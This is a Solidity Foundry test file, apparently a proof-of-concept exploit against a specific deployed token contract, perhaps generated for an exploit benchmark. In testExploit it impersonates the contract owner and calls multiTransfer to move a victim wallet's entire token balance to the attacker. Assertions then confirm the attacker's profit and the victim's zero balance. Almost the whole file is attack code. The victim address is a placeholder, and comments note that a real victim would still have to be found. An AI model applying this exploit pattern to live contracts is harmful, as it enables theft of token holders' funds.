pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ISHF {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external;
    function authorize(address adr) external;
    function isAuthorized(address adr) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f;
    address attacker = address(this);
    address victim = address(0x1234567890123456789012345678901234567890); // Example victim address
    // In a real fork, we would need to find an actual victim address with balance

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll work with the deployed contract
        // We need to identify the owner and a victim with tokens
        address owner = ISHF(TARGET).getOwner();
        vm.label(owner, "Contract Owner");

        // We'll use a known victim address - in a real scenario we'd find one via on-chain analysis
        // For this PoC, let's assume there's a victim with tokens at a specific address
        address victim = address(0x1234567890123456789012345678901234567890);
        vm.label(victim, "Victim Wallet");

        // Check victim's initial balance (optional)
        uint256 victimInitialBalance = ISHF(TARGET).balanceOf(victim);
        console.log("Victim initial balance:", victimInitialBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f).balanceOf(address(this));
        // Step 1: Get the contract owner
        address owner = ISHF(TARGET).getOwner();
        console.log("Contract owner:", owner);

        // Step 2: Impersonate the owner to become authorized
        vm.startPrank(owner);

        // Step 3: Find victim's current balance
        uint256 victimBalance = ISHF(TARGET).balanceOf(victim);
        console.log("Victim balance before attack:", victimBalance);

        // Step 4: Record attacker's initial balance
        uint256 attackerInitialBalance = ISHF(TARGET).balanceOf(attacker);
        console.log("Attacker initial balance:", attackerInitialBalance);

        // Step 5: Prepare arrays for multiTransfer
        address[] memory recipients = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        recipients[0] = attacker;  // Send to attacker
        amounts[0] = victimBalance; // Transfer victim's entire balance

        // Step 6: Execute the exploit - transfer from victim to attacker
        ISHF(TARGET).multiTransfer(victim, recipients, amounts);

        vm.stopPrank();

        // Step 7: Verify the attack succeeded
        uint256 attackerFinalBalance = ISHF(TARGET).balanceOf(attacker);
        uint256 victimFinalBalance = ISHF(TARGET).balanceOf(victim);

        console.log("Attacker final balance:", attackerFinalBalance);
        console.log("Victim final balance:", victimFinalBalance);
        console.log("Profit:", attackerFinalBalance - attackerInitialBalance);

        // Oracle check: attacker balance increased
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker balance should increase");
        assertEq(victimFinalBalance, 0, "Victim should have zero balance");
        uint256 finalBalance = IERC20(0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

